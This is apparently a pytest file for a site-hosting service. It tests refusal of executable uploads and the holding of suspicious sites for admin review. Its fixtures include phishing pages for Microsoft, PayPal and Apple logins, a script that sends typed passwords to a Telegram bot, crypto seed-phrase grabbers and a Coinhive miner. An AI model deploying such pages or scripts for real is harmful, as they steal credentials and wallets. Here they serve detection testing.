import io
import json
import struct
import zipfile
from pathlib import Path

import pytest

from _core import scan
from test_api import make_zip, page
from test_auth import ALICE, BOB, client, sign_in  # noqa: F401  (client is a fixture)

ROOT = Path(__file__).resolve().parent.parent


def zip_bytes(files: dict[str, bytes | str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for path, content in files.items():
            zf.writestr(path, content)
    return buf.getvalue()


def upload(client, files, headers=None):
    return client.post("/api/sites", files={"file": ("s.zip", zip_bytes(files))}, headers=headers or {})


def pe() -> bytes:
    head = bytearray(b"MZ" + b"\0" * 0x7E)
    struct.pack_into("<I", head, 0x3C, 0x40)
    head[0x40:0x44] = b"PE\0\0"
    return bytes(head)


ELF = b"\x7fELF\x02\x01\x01" + b"\0" * 57
MACHO = b"\xcf\xfa\xed\xfe" + b"\0" * 28
FAT = b"\xca\xfe\xba\xbe" + struct.pack(">I", 2) + b"\0" * 40
JAVA_CLASS = b"\xca\xfe\xba\xbe" + struct.pack(">HH", 0, 61) + b"\0" * 40
APK = zip_bytes({"AndroidManifest.xml": "x", "classes.dex": "dex"})
JAR = zip_bytes({"META-INF/MANIFEST.MF": "Manifest-Version: 1.0"})


# ---- executables ----


def test_blocked_list_matches_the_client():
    shared = json.loads((ROOT / "lib/blocked-files.json").read_text())
    assert sorted(shared["extensions"]) == sorted(scan.BLOCKED_EXTENSIONS)
    assert sorted(shared["bundles"]) == sorted(scan.BLOCKED_BUNDLES)


@pytest.mark.parametrize(
    "path",
    ["tools/setup.exe", "a.MSI", "run.bat", "x.ps1", "lib/libfoo.so", "game.apk", "app.jar", "Mac.app/Info.plist"],
)
def test_executables_by_extension_are_refused(client, monkeypatch, path):
    sign_in(client, monkeypatch, ALICE)
    r = upload(client, {"index.html": "<h1>hi</h1>", path: "anything"})
    assert r.status_code == 400
    assert r.json()["error"] == f"Executable files can't be shared: {path}"


@pytest.mark.parametrize(
    "data", [pe(), ELF, MACHO, FAT, APK, JAR], ids=["pe", "elf", "macho", "fat", "apk-zip", "jar-zip"]
)
def test_executables_by_magic_bytes_are_refused(client, monkeypatch, data):
    sign_in(client, monkeypatch, ALICE)
    r = upload(client, {"index.html": "<h1>hi</h1>", "assets/logo.png": data})
    assert r.status_code == 400
    assert r.json()["error"] == "Executable files can't be shared: assets/logo.png"


def test_first_offending_path_is_named_and_lookalikes_pass():
    assert scan.first_executable({"b/x.exe": b"", "a/y.dll": b"", "index.html": b""}) == "a/y.dll"
    ok = {
        "index.html": b"MZ is not enough",  # starts like a PE but isn't one
        "Main.class": JAVA_CLASS,  # 0xCAFEBABE but a Java class, not a fat Mach-O
        "docs/report.zip": zip_bytes({"readme.txt": "hi"}),  # an ordinary zip
        "my.app.js": b"console.log(1)",
        "example.com.html": b"<p>hi</p>",
    }
    assert scan.first_executable(ok) is None


def test_executables_refused_when_publishing_too(client, monkeypatch):
    sign_in(client, monkeypatch, ALICE)
    sid = upload(client, {"index.html": "v1"}).json()["site"]["id"]
    files = {"file": ("s.zip", zip_bytes({"index.html": "v2", "bin/tool": ELF}))}
    r = client.post(f"/api/sites/{sid}/versions", files=files)
    assert r.status_code == 400 and r.json()["error"] == "Executable files can't be shared: bin/tool"


# ---- content scan: what must NOT be held ----

TODO_LOGIN = """<!doctype html><title>Todo</title>
<h1>My todos</h1>
<form action="/login" method="post">
  <input name="email" type="email" placeholder="Email"><input name="password" type="password" placeholder="Password">
  <button>Sign in</button>
</form>
<p>Sign in with Google</p>
<script src="app.js"></script>"""
TODO_JS = """document.querySelector('form').onsubmit = async (e) => {
  e.preventDefault();
  await fetch('/api/login', {method: 'POST', body: JSON.stringify({email, password})});
  const r = await fetch('https://jsonplaceholder.typicode.com/todos');
};"""

NETFLIX_CLONE = """<title>Netflix clone</title><h1>Netflix</h1>
<form onsubmit="return false"><input type="email"><input type="password"><button>Sign In</button></form>
<script>fetch("https://api.themoviedb.org/3/movie/popular?api_key=x").then(r => r.json())</script>"""

PORTFOLIO = """<title>Jane Doe</title><h1>Jane Doe, designer</h1>
<p>I worked on Google Maps and Microsoft Teams, and ship apps for Amazon sellers.</p>
<form action="https://formspree.io/f/abc123"><input name="email"><textarea name="message"></textarea></form>"""

DASHBOARD = """<title>Admin dashboard</title><h2>Settings</h2>
<label>Current password <input type="password"></label>
<p>Connect your PayPal account to get paid.</p>
<form action="http://localhost:8000/api/settings" method="post"><input type="password" name="new"></form>"""

WALLET_UI = """<title>Wallet</title><h1>Back up your wallet</h1>
<p>Write down your 12-word recovery phrase and keep it somewhere safe.</p>
<ol><li>apple</li><li>river</li></ol><input type="email" placeholder="Email for reminders">"""

SIGNUP = """<title>Sign up</title><h1>Create an account</h1>
<form action="https://api.myapp.dev/signup"><input type="password" placeholder="Password"></form>
<p>Or continue with Google, or sign in with Apple.</p>"""


@pytest.mark.parametrize(
    "files",
    [
        {"index.html": TODO_LOGIN, "app.js": TODO_JS},
        {"index.html": NETFLIX_CLONE},
        {"index.html": PORTFOLIO},
        {"index.html": DASHBOARD},
        {"index.html": WALLET_UI},
        {"index.html": SIGNUP},
        {"index.html": "<p>Learn about Monero, cryptocurrency mining and pools.</p>"},
    ],
    ids=[
        "todo-login",
        "netflix-clone",
        "portfolio",
        "dashboard",
        "wallet-backup-screen",
        "signup-social",
        "mining-blog",
    ],
)
def test_ordinary_prototypes_are_not_held(client, monkeypatch, files):
    sign_in(client, monkeypatch, ALICE)
    r = upload(client, files)
    assert r.status_code == 200, r.text
    assert r.json()["held"] is False and "reasons" not in r.json()
    assert page(client, f"/s/{r.json()['site']['id']}/") == files["index.html"]


# ---- content scan: what IS held ----

PHISH_FORM = """<title>Sign in to your Microsoft account</title><h1>Microsoft</h1>
<form action="https://login-verify.example.net/collect.php" method="post">
<input name="loginfmt" type="email"><input name="passwd" type="password"><button>Next</button></form>"""

PHISH_TELEGRAM = """<title>PayPal: Log in</title><div>PayPal</div>
<input id="e" type="email"><input id="p" type="password"><button id="go">Log In</button>
<script src="s.js"></script>"""
PHISH_TELEGRAM_JS = """go.onclick = () => fetch("https://api.telegram.org/bot123:ABC/sendMessage", {
  method: "POST", body: JSON.stringify({chat_id: 1, text: e.value + " " + p.value + " pass"})});"""

PHISH_RELAY = """<title>Apple ID</title><h1>Sign in to iCloud</h1>
<form action="https://formspree.io/f/xyz"><input type="email"><input type="password"></form>"""

SEED_GRAB = """<title>MetaMask</title><h1>Restore your wallet</h1>
<p>Enter your Secret Recovery Phrase to continue.</p>
<textarea name="mnemonic" placeholder="Separate each word with a space"></textarea><button>Restore</button>"""

SEED_GRID = (
    "<title>Wallet sync</title><p>Enter your 12 words</p>"
    + "".join(f'<input type="text" class="w" required>' for _ in range(12))
    + "<button>Validate</button>"
)

MINER = """<title>Free game</title><canvas></canvas>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>var miner = new CoinHive.Anonymous('key'); miner.start();</script>"""


@pytest.mark.parametrize(
    "files, word",
    [
        ({"index.html": PHISH_FORM}, "Microsoft"),
        ({"index.html": PHISH_TELEGRAM, "s.js": PHISH_TELEGRAM_JS}, "telegram"),
        ({"index.html": PHISH_RELAY}, "formspree"),
        ({"index.html": SEED_GRAB}, "seed"),
        ({"index.html": SEED_GRID}, "seed"),
        ({"index.html": MINER}, "coinhive"),
        ({"index.html": "<p>game</p>", "w/cryptonight.wasm": b"\0asm"}, "cryptonight"),
        ({"index.html": "<script src=m.js></script>", "m.js": "connect('stratum+tcp://pool.example:3333')"}, "stratum"),
    ],
    ids=[
        "phish-form",
        "phish-telegram",
        "phish-relay",
        "seed-textarea",
        "seed-12-inputs",
        "coinhive",
        "wasm",
        "stratum",
    ],
)
def test_suspicious_uploads_are_held(client, monkeypatch, files, word):
    sign_in(client, monkeypatch, ALICE)
    r = upload(client, files)
    assert r.status_code == 200, r.text  # the upload itself goes through
    body = r.json()
    assert body["held"] is True and body["reasons"]
    assert word.lower() in " ".join(body["reasons"]).lower()
    sid = body["site"]["id"]
    held = client.get(f"/r/{sid}/")
    assert held.status_code == 451 and "waiting for a safety review" in held.text
    assert client.get(f"/s/{sid}/").status_code == 451
    assert client.get(f"/s/{sid}@1/index.html").status_code == 451
    assert client.get(f"/api/sites/{sid}/hold").json() == {"held": True, "reasons": body["reasons"]}


def test_a_held_site_stays_held_on_later_clean_versions(client, monkeypatch):
    sign_in(client, monkeypatch, ALICE)
    body = upload(client, {"index.html": PHISH_FORM}).json()
    sid = body["site"]["id"]
    r = client.post(f"/api/sites/{sid}/versions", files={"file": ("s.zip", make_zip({"index.html": "clean"}))})
    assert r.json()["held"] is True  # an admin still has to look at version 1
    assert client.get(f"/s/{sid}/").status_code == 451


def test_upload_scan_off(client, monkeypatch):
    monkeypatch.setenv("UPLOAD_SCAN", "off")
    sign_in(client, monkeypatch, ALICE)
    r = upload(client, {"index.html": MINER})
    assert r.json()["held"] is False
    assert client.get(f"/r/{r.json()['site']['id']}/").status_code == 200
    assert upload(client, {"index.html": "x", "a.exe": "x"}).status_code == 400  # executables are always refused


# ---- review ----


@pytest.fixture
def held_site(client, monkeypatch):
    monkeypatch.setenv("ADMIN_EMAILS", "bob@example.com")
    sign_in(client, monkeypatch, ALICE)
    return upload(client, {"index.html": SEED_GRAB}).json()


def test_only_admins_review_holds(client, monkeypatch, held_site):
    sid = held_site["site"]["id"]
    assert client.get("/api/admin/holds").status_code == 403  # Alice is signed in but not an admin
    assert client.post(f"/api/admin/holds/{sid}", json={"decision": "approve"}).status_code == 403
    client.post("/api/auth/logout")
    client.cookies.clear()
    assert client.get("/api/admin/holds").status_code == 401
    # nobody else can read the hold's reasons either
    sign_in(client, monkeypatch, {"sub": "333", "email": "eve@example.com", "name": "Eve"})
    assert client.get(f"/api/sites/{sid}/hold").status_code == 403


def test_admin_approves_a_hold(client, monkeypatch, held_site):
    sid = held_site["site"]["id"]
    sign_in(client, monkeypatch, BOB)
    listed = client.get("/api/admin/holds?status=held").json()["holds"]
    assert [(h["site_id"], h["n"], h["status"], h["owner_email"]) for h in listed] == [
        (sid, 1, "held", "alice@example.com")
    ]
    assert client.post(f"/api/admin/holds/{sid}", json={"decision": "maybe"}).status_code == 400
    r = client.post(f"/api/admin/holds/{sid}", json={"decision": "approve"})
    assert r.status_code == 200
    assert page(client, f"/s/{sid}/") == SEED_GRAB
    assert client.get("/api/admin/holds").json()["holds"] == []
    done = client.get("/api/admin/holds?status=approved").json()["holds"][0]
    assert done["reviewed_by"] == "bob@example.com" and done["reviewed_at"]
    assert client.post(f"/api/admin/holds/{sid}", json={"decision": "approve"}).status_code == 404


def test_admin_rejects_a_hold(client, monkeypatch, held_site):
    sid = held_site["site"]["id"]
    sign_in(client, monkeypatch, BOB)
    assert client.post(f"/api/admin/holds/{sid}", json={"decision": "reject"}).status_code == 200
    assert client.get(f"/s/{sid}/").status_code == 404  # unpublished
    assert client.get(f"/api/sites/{sid}").status_code == 404
    assert client.get("/api/admin/holds?status=rejected").json()["holds"][0]["site_id"] == sid
